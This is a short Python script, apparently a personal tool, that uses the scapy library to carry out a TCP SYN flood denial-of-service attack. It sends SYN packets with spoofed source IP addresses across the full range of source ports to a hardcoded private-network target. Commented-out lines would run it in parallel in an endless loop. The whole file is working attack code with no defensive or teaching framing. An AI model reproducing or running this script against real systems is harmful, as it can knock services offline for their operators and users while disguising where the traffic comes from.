#!usr/bin/env python3
# -*- coding: utf-8 -*-

"""

"""

__author__ = 'LiTian'


from scapy.all import *
from multiprocessing import Pool
import os


def syn_flood(tgt, dPort):
    src_list = ['201.1.1.2', '10.1.1.102', '69.1.1.2', '125.130.5.199']
    a = range(1024, 65535)
    for t in a:
        index = random.randrange(4)
        ipLayer = IP(src=src_list[index], dst=tgt)
        tcpLayer = TCP(sport=t, dport=dPort,flags="S")
        packet = ipLayer / tcpLayer
        send(packet)


if __name__ == '__main__':
    # p = Pool(os.cpu_count()-1)
    # while True:
    #     p.apply_async(syn_flood, args=('192.168.1.238', 5000))
    syn_flood('192.168.1.238', 5000)
